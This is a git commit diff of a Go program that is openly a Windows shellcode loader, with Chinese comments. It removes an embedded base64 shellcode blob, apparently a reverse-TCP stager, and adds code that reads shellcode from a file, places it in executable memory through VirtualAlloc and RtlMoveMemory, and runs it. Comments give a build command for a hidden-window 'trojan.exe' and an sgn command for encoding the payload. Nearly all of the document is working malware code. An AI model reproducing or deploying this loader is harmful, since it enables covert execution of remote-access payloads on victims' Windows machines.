6293c8e1e5d6981bdca8c0c58dd13d173f3de9dd
EatFan <eatfan0921@163.com>
2025-06-21 15:32:45 +0800

    更新

--- main.go
+++ main.go
@@ -4,9 +4,8 @@
 package main
 
 import (
-	"encoding/base64"
+	"os"
 	"syscall"
-	"time"
 	"unsafe"
 )
 
@@ -17,36 +16,25 @@ const (
 )
 
 func main() {
-	// 将下面内容替换为生成的 shellcode base64 字符串
-	payloadB64 := `/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHB
-yQ1BAcHi7VJIi1Igi0I8SAHQZoF4GAsCQVEPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY
-41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0Ac
-SQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJ
-ieZIgeygAQAASYnlSbwCAAG6CtM3B0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoK
-QV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/
-znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhI
-ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoA
-WkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V
-`
-
-	// 解码 shellcode
-	shellcode, err := base64.StdEncoding.DecodeString(payloadB64)
+	// 读取shellcode
+	shellcode, err := os.ReadFile("shellcode.bin")
 	if err != nil {
 		return
 	}
-
-	// 调用 VirtualAlloc 分配可执行内存
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	virtualAlloc := kernel32.NewProc("VirtualAlloc")
-	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-
-	// 拷贝 shellcode 到分配的内存中
-	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
-	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	// 转换为函数并执行
+	// 获取windows api
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	// 申请内存的api
+	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
+	// 拷贝shellcode到指定内存的Windows api
+	RtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
+	// 申请内存
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000, 0x40)
+	// 复制shellcode到指定内存
+	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	// 运行内存中的shellcode
 	syscall.Syscall(addr, 0, 0, 0, 0)
 
-	time.Sleep(30 * time.Second)
-
+	// GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o trojan.exe main.go
 }
+
+// sgn -a 64 -c 1 -o p1.bin payload.bin
